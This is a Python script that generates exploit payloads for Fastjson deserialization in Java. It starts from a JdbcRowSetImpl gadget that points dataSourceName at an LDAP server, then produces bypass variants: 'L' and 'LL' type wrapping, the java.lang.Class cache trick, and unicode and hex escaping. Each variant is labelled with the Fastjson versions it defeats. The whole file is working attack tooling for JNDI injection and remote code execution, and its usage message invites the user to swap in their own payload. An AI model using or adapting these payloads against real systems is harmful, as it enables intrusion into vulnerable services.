#!usr/bin/env python  
# -*- coding:utf-8 -*-

import json,copy
import sys

from json import JSONDecodeError, load


class FastJson:
    def __init__(self, base_payload):
        try:
            json.loads(base_payload)
        except JSONDecodeError as ex:
            raise ex
        self.base_payload = base_payload

    def gen_common(self, payload, op, func):
        tmp_payload = json.loads(payload)
        dct_objs = [tmp_payload]

        while len(dct_objs) > 0:
            tmp_objs = []
            for dct_obj in dct_objs:
                tmp_obj = copy.deepcopy(dct_obj)

                for key in tmp_obj:
                    # op < 4 对@type的值进行转换
                    if op < 4:
                        if key == "@type" and tmp_obj[key] != "java.lang.Class":
                            dct_obj[key] = func(dct_obj[key])
                    # op >=4 对所有字符串键值进行转换
                    else:
                        new_key = func(key)
                        dct_obj[new_key] = dct_obj.pop(key)
                        if type(dct_obj[new_key]) == str:
                            dct_obj[new_key] = func(dct_obj[new_key])
                        key = new_key

                    if type(dct_obj[key]) == dict:
                        tmp_objs.append(dct_obj[key])
            dct_objs = tmp_objs
        return json.dumps(tmp_payload)

    def payload0(self, payload: str):
        return json.dumps(json.loads(self.base_payload))
    # 对@type的value增加L开头，;结尾的payload
    def payload1(self, payload: str):
        return self.gen_common(payload, 1, lambda v: "L" + v + ";")

    # 对@type的value增加LL开头，;;结尾的payload
    def payload2(self, payload: str):
        return self.gen_common(payload, 2, lambda v: "LL" + v + ";;")
    
    # 生成cache绕过payload
    def payload3(self, payload: str):
        load_payload = json.loads(payload)
        res_payload = {"rand1":{}}
        dct_objs = [load_payload['rand1']]
        res_objs = [res_payload['rand1' ]]
        while len(dct_objs) > 0:
            dct_obj = dct_objs.pop(0)
            res_obj = res_objs.pop(0)
            for key in dct_obj:
                if key == "@type":
                    cache_payload = {
                        "@type": "java.lang.Class",
                        "val": "%s" % dct_obj[key]
                    }
                    res_obj['rand1'] = cache_payload
                res_obj[key] = dct_obj[key]
                if type(dct_obj[key]) == dict:
                    res_obj[key] = {}
                    dct_objs.append(dct_obj[key])
                    res_objs.append(res_obj[key])
      
        return json.dumps(res_payload)

    # 生成 cache + L型 payload
    def payload4(self, payload: str):
        return self.payload3(self.payload1(payload))

    # 对@type的value进行\u
    def payload5(self, payload: str):
        return self.gen_common(payload, 4,
                               lambda v: ''.join('\\u{:04x}'.format(c) for c in v.encode())).replace("\\\\", "\\")

    # 对@type的value进行\x
    def payload6(self, payload: str):
        return self.gen_common(payload, 5, 
                               lambda v: ''.join('\\x{:02x}'.format(c) for c in v.encode())).replace("\\\\", "\\")

    def gen(self):

        base_funcs = [self.payload0, self.payload1, self.payload2, 
                    self.payload3, self.payload4]

        for func in base_funcs:
            payload = func(self.base_payload)
            yield [payload, self.payload5(payload), self.payload6(payload)]

if __name__ == '__main__':
    try :
        payload = '''{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/test",
    "autoCommit": true
  }
}'''    
        lists = ["基础型",
                "L型  1.2.25 <= v <= 1.2.41", 
                "LL型  1.2.25 <= v <= 1.2.42", 
                "cache型  1.2.25 <= v <= 1.2.47(autotype close)",
                "cache+L型  1.2.25 <= v <= 1.2.47(all)"]

        fjp = FastJson(payload)
        i = 1
        for payloads in fjp.gen() :
            print(str(i) + ":" + lists[i - 1], end = "\n\n")
            for p in payloads:
                print(p, end = "\n\n")
            i += 1
    except :
        print('''Usage: Open source code and replace basic payload.''')
        print()
        raise
